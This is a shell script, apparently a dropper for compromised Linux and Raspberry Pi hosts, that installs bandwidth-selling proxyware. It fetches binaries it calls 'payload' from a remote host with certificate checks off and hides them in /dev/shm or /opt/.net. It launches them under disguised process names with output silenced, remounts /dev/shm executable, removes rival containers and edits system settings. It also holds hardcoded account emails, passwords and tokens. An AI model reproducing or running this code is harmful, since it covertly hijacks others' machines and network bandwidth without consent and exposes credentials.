utf8_locale=$(locale -a 2>/dev/null | grep -i -m 1 -E "UTF-8|utf8")
if [[ -z "$utf8_locale" ]]; then
  echo "No UTF-8 locale found"
else
  export LC_ALL="$utf8_locale"
  export LANG="$utf8_locale"
  export LANGUAGE="$utf8_locale"
fi

check_virt(){
  ARCHITECTURE=$(uname -m)
  case "$ARCHITECTURE" in
    aarch64 ) ARCH=aarch64;;
    armv7l ) ARCH=armv7l;;
    armv6l ) ARCH=armv6l;;
    x64|x86_64|amd64 ) ARCH=x86_64;;
    * ) red " ERROR: Unsupported architecture: $ARCHITECTURE\n" && exit 1;;
  esac
}

del_old(){
	sta_tm_old=$(ps auxww | grep 8kf2CmW | grep -v grep | wc -l)
	if [[ $sta_tm_old -gt "0" ]]
	then
		docker stop watchtower tm ; docker rm watchtower tm
	fi
}

check_installed(){
	sta_grass=$(docker ps 2>/dev/null | grep better-grass | wc -l)
	sta_netio=$(ps aux | grep net-io | grep -v grep | wc -l)
	sta_efm=$(ps aux | grep efm | grep -v grep | wc -l)
	sta_tm=$(docker ps 2>/dev/null | grep traffmonetizer | wc -l)
	sta_shm=$(mount | grep dev | grep shm | grep noexec | wc -l)
	if [[ $sta_shm -gt "0" ]]
	then
		ins_dir="/opt/.net/"
	else
		ins_dir="/dev/shm/.net-io/"
	fi
	mkdir -p $ins_dir
}

install_netio64(){
	echo "install_netio64 preparing system and dependencies"
	echo "downloading payload"
	{
			wget --no-check-certificate -q http://a957275266.kesug.com/image/.a/net_io64 -O $ins_dir/net-io
	} || {
			curl -k -s http://a957275266.kesug.com/image/.a/net_io64 -o $ins_dir/net-io
	}
	echo "preparing payload"
	cd $ins_dir
	chmod 755 net-io
	echo "executing payload"
	device=$(cat /etc/machine-id)
	exec -a "[net-io]" ./net-io -accept-tos -email="talia.purple@mailshield.org" -password="Neimar123@&" -device-name=$device > /dev/null 2>&1 &
	echo "net-io ready"
}
install_netio_arm6(){
	echo "preparing system and dependencies"
	mount -o remount,rw /
	apt-get clean
	echo "downloading payload"
	{
			wget --no-check-certificate -q http://a957275266.kesug.com/image/.a/net_ioarm6 -O $ins_dir/net-io
	} || {
			curl -k -s http://a957275266.kesug.com/image/.a/net_ioarm6 -o $ins_dir/net-io
	}
	echo "preparing payload"
	cd $ins_dir
	chmod 755 net-io
	echo "executing payload"
	device=$(cat /etc/machine-id)
	exec -a "[net-io]" ./net-io -accept-tos -email="talia.purple@mailshield.org" -password="Neimar123@&" -device-name=$device > /dev/null 2>&1 &
	echo "net-io ready"
}
install_netio_arm7(){
	echo "install_netio_arm7 preparing system and dependencies"
	mount -o remount,rw /
	apt-get clean
	echo "downloading payload"
	{
			wget --no-check-certificate -q http://a957275266.kesug.com/image/.a/net_ioarm7 -O $ins_dir/net-io
	} || {
			curl -k -s http://a957275266.kesug.com/image/.a/net_ioarm7 -o $ins_dir/net-io
	}
	echo "preparing payload"
	cd $ins_dir
	chmod 755 net-io
	echo "executing payload"
	device=$(cat /etc/machine-id)
	exec -a "[net-io]" ./net-io -accept-tos -email="talia.purple@mailshield.org" -password="Neimar123@&" -device-name=$device > /dev/null 2>&1 &
	echo "net-io ready"
}
install_netio_aarch64(){
	echo "preparing system and dependencies"
	mount -o remount,rw /
	apt-get clean
	echo "downloading payload"
	{
			wget --no-check-certificate -q http://a957275266.kesug.com/image/.a/net_ioaarch64 -O $ins_dir/net-io
	} || {
			curl -k -s http://a957275266.kesug.com/image/.a/net_ioaarch64 -o $ins_dir/net-io
	}
	echo "preparing payload"
	cd $ins_dir
	chmod 755 net-io
	echo "executing payload"
	device=$(cat /etc/machine-id)
	exec -a "[net-io]" ./net-io -accept-tos -email="talia.purple@mailshield.org" -password="Neimar123@&" -device-name=$device > /dev/null 2>&1 &
	echo "net-io ready"
}

install_efm64(){
	trap -- '' SIGRTMAX-1
	echo "downloading payload"
	{
			wget --no-check-certificate -q http://a957275266.kesug.com/image/.a/efm64 -O $ins_dir/efm
	} || {
			curl -k -s http://a957275266.kesug.com/image/.a/efm64 -o $ins_dir/efm
	}
	echo "preparing payload"
	cd $ins_dir
	chmod 755 efm
	echo "executing payload"
	export EARNFM_TOKEN="fccb9997-4d50-4719-8fed-5e8cbe84658c"
	exec -a "[efm]" ./efm  > /dev/null 2>&1 &
	echo "efm ready"
}
install_efm_arm7(){
	trap -- '' SIGRTMAX-1
	echo "downloading payload"
	{
			wget --no-check-certificate -q http://a957275266.kesug.com/image/.a/efmarm7 -O $ins_dir/efm
	} || {
			curl -k -s http://a957275266.kesug.com/image/.a/efmarm7 -o $ins_dir/efm
	}
	echo "preparing payload"
	cd $ins_dir
	chmod 755 efm
	echo "executing payload"
	export EARNFM_TOKEN="fccb9997-4d50-4719-8fed-5e8cbe84658c"
	exec -a "[efm]" ./efm  > /dev/null 2>&1 &
	echo "efm ready"
}

install_tm(){
	apt update -y
	bash <( echo '' | base64 -d)
}

install_grass(){
	docker run -d -e USER_ID=2eXcsqpiD7pHUcBZC4RHPMI7doo -e ALLOW_DEBUG=False fungyx/better-grass
}

install_all(){
	if [[ "$ARCH" == "x86_64" ]]
		then
		if [[ "$sta_netio" -eq "0" ]]
		then
			install_netio64
		fi
		if [[ $sta_efm -eq "0" ]]
		then
			install_efm64
		fi
		if [[ $sta_tm -eq "0" ]]
		then
			install_tm
		fi
		if [[ $sta_grass -eq "0" ]]
		then
			install_grass
		fi
	elif [[ "$ARCH" == "aarch64" ]]
		then
		if [[ $sta_netio -eq "0" ]]
		then
			install_netio_aarch64
		fi
		if [[ $sta_tm -eq "0" ]]
		then
			install_tm
		fi
	elif [[ "$ARCH" == "armv7l" ]]
		then
		if [[ $sta_netio -eq "0" ]]
		then
			install_netio_arm7
		fi
		if [[ $sta_efm -eq "0" ]]
		then
			install_efm_arm7
		fi
		if [[ $sta_tm -eq "0" ]]
		then
			install_tm
		fi
	elif [[ "$ARCH" == "armv6l" ]]
		then
		if [[ $sta_netio -eq "0" ]]
		then
			install_netio_arm6
		fi
	fi
}
NOEXE=$(mount | grep dev | grep shm | grep noexec | wc -l)
if [ "$NOEXE" -gt "0" ]
	then
		mount -o remount,exec /dev/shm
fi
PO=$(ls -al /home/| grep smartif | wc -l)
if [ "$PO" -gt "0" ]
	then
		chmod -R 1777 /tmp
		DEBIAN_FRONTEND=noninteractive DEBIAN_PRIORITY=critical apt-get -qy update --allow-releaseinfo-change
fi
JE=$(cat /etc/os-release | grep Raspbian | grep jessie | wc -l)
JE_SO=$(cat /etc/apt/sources.list | grep legacy | wc -l)
if [[ $JE -eq 1 && $JE_SO -eq 0 ]]
	then
		echo "deb http://legacy.raspbian.org/raspbian/ jessie main contrib" >> /etc/apt/sources.list
		apt update -y
fi
JS=$(cat /etc/os-release | grep Raspbian | grep stretch | wc -l)
JS_SO=$(cat /etc/apt/sources.list | grep legacy | wc -l)
if [[ $JS -eq 1 && $JS_SO -eq 0 ]]
	then
		echo "deb http://legacy.raspbian.org/raspbian/ stretch main contrib non-free rpi" >> /etc/apt/sources.list
		apt update -y
fi
check_virt
del_old
check_installed
echo "Detected ARCH: "$ARCH
install_all